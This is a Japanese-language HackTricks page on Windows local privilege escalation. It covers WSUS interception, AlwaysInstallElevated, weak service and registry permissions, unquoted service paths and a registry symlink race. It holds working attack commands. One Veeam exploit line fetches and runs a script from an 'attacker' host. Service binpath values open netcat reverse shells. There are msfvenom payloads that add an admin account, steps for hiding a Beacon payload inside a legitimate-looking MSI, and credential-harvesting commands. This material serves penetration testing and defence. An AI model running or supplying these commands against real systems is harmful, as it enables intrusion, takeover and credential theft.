# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクターを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期 Windows 理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細は次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が分からない場合は、続ける前に次のページを読むべきです:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**システムの列挙**、実行ファイルの起動、あるいは **あなたの活動の検知** を**妨げる**可能性のあるさまざまなものがあります。権限昇格の列挙を始める前に、次の **ページ** を**読んで**、これらすべての **defenses** **mechanisms** を**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` 経由で起動された UIAccess process は、AppInfo の secure-path checks を回避できる場合、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass ワークフローはこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write (RegPwn) に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability があるか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[site](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft security vulnerabilities の詳細情報を検索するのに便利です。このデータベースには 4,700 件以上の security vulnerabilities があり、Windows 環境が持つ**巨大な attack surface**を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables に保存されている credential/Juicy info はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

これを有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で学べます
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプライン実行の詳細は記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、実行の全詳細や出力結果は取得できない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs の最後の15件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行における完全なアクティビティと全内容の記録が取得され、各コードブロックが実行されるたびに文書化されることが保証されます。このプロセスは、各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意ある挙動の分析に有用です。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近 20 件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

アップデートが http**S** ではなく http で要求されている場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが非SSLの WSUS update を使用しているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell では以下のようになります:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
もし次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> ローカルユーザーの proxy を変更する権限があり、かつ Windows Updates が Internet Explorer の設定で構成された proxy を使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分自身の通信を傍受し、資産上で権限昇格されたユーザーとして code を実行できる。
>
> さらに、WSUS service は現在のユーザーの設定を使用するため、certificate store も使用する。WSUS ホスト名用の self-signed certificate を生成し、その certificate を現在のユーザーの certificate store に追加すれば、HTTP と HTTPS の両方の WSUS traffic を傍受できる。WSUS は certificate に対して trust-on-first-use 型の validation を実装するための HSTS のような機構を使用していない。提示された certificate がユーザーにより trusted で、正しい hostname を持っていれば、service に受け入れられる。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

Windows **domain** 環境では、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced** な環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、そしてドメイン内でコンピュータを作成できることが含まれます。これらの **requirements** は **default settings** で満たされる点に注意してください。

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) を確認してください

攻撃の流れについて詳しくは [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を参照してください

## AlwaysInstallElevated

**If** この 2 つの registers が **enabled**（値が **0x1**）なら、任意の権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（execute）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter セッションがある場合、この手法はモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使って、現在のディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループ追加を促す事前コンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要です）：
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを読んでください。 **command lines** を **実行** したいだけなら、 "**.bat**" ファイルを wrap できることに注意してください。

{{#ref}}
msi-wrapper.md
{{endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- **AlwaysPrivesc** などの名前でプロジェクトに名前を付け、場所に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- ファイルを追加する手順の 3/4 まで (**choose files to include**) **Next** をクリックし続けます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされたアプリをより正規に見せられる他のプロパティも変更できます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラが実行されるとすぐに beacon payload が実行されるようになります。
- **Custom Action Properties** の下で、**Run64Bit** を **True** に変更します。
- 最後に、**build it** します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの **installation** を **background:** で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus and Detectors

### Audit Settings

これらの設定は、何が**ログに記録されるか**を決定するため、注意を払う必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されるかを知っておくと興味深いです
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが**一意で、ランダム化され、定期的に更新**されることを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されていればローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS** (Local Security Authority Subsystem Service) に保存されます。\
[**このページの WDigest の詳細**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる **メモリの読み取り** やコード注入の試みを **ブロック** して、システムをさらに保護しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks のような脅威から、デバイスに保存された credentials を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### ユーザーとグループの列挙

所属しているグループの中に、興味深い権限を持つものがないか確認するべきです
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループのいずれかに属している**場合、**権限昇格できる**可能性があります。特権グループについて学び、それを悪用して権限昇格する方法はここで確認してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**詳しく学ぶ**には、このページで**token**とは何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
次のページで、**興味深い tokens** について学び、それらを悪用する方法を確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン済みユーザー / Sessions
```bash
qwinsta
klist sessions
```
### Home folders
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず最初に、プロセスのコマンドライン内にパスワードがないか**確認**してください。\
実行中の何らかのバイナリを**上書きできるか**、またはバイナリのフォルダに書き込み権限があるかを確認し、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用してください：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に [**electron/cef/chromium debuggers** が実行中か確認してください。権限昇格に悪用できる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** を使って、実行中プロセスのメモリダンプを作成できます。FTP のようなサービスは、**credentials がメモリ上に平文で存在**することがあるので、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEMとして実行されているApplicationsは、userがCMDを起動したり、ディレクトリを閲覧したりできる場合があります。**

Example: "Windows Help and Support" (Windows + F1)で "command prompt" を検索し、"Click to open Command Prompt" をクリックする

## Services

Service Triggers により、Windows は特定の条件が発生したときに service を開始できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、trigger を発火させることで特権 service を起動できることがよくあります。列挙と activation の技術についてはここを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使ってサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことが推奨されます。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意の service を変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe をここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

このエラーが出る場合（たとえば SSDPSRV の場合）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次の方法で有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は、（XP SP1 では）動作するために SSDPSRV に依存していることに注意してください**

**この問題に対する別の回避策** は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対して **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまな権限によって昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービス binary の再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、service configurations を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: service configurations を変更する能力を継承します。
- **GENERIC_ALL**: service configurations を変更する能力も継承します。

この脆弱性の検出と exploit には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行される binary を変更できるか**、または binary が配置されているフォルダに**書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
**wmic** を使って service によって実行されるすべての binary を取得し（system32 以外）、**icacls** を使って権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
次のようにして、サービスの**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もし持っていれば、サービスによって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成し、その後 **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。registry の **symbolic link race** により、この特権書き込みを **任意の HKLM path** にリダイレクトでき、任意の HKLM **value write** primitive が得られます。

キーとなる場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` はインストール済みの accessibility 機能を一覧します。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザー制御可能な設定を保存します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop 遷移中に作成され、ユーザーが書き込み可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** の value を設定します。
2. secure-desktop のコピーをトリガーします（例: **LockWorkstation**）。これにより AT broker の flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race** に勝ちます。oplock が発火したら、**HKLM Session ATConfig** key を protected な HKLM target へ向かう **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選んだ value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を得たら、service configuration values を上書きして LPE に移行します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが起動できる service（例: **`msiserver`**）を選び、書き込み後にそれをトリガーします。**Note:** 公開されている exploit implementation は race の一部として **locks the workstation** します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分**です：


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが quotes で囲まれていない場合、Windows は space の前までの各末尾を順番に実行しようとします。

例えば、_C:\Program Files\Some Folder\Service.exe_ というパスでは、Windows は次を実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みのWindowsサービスに属するものを除いて、すべてのunquoted service pathsを列挙してください:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit で検出および exploit できます: `exploit/windows/local/trusted\_service\_path` metasploit でサービス binary を手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、binary を指すように設定できます。この binary が置き換え可能であれば、privilege escalation が可能かもしれません。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## Applications

### Installed Applications

**binaries の permissions**（上書きできて privilege escalation できるかもしれません）と **folders** ([DLL Hijacking](dll-hijacking/index.html)) の **permissions** を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

configファイルを変更して特別なファイルを読み取れるか、または Administrator アカウントによって実行される binary を変更できるかを確認します (schedtasks)。

システム内の弱い folder/file 権限を見つける方法の1つは次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
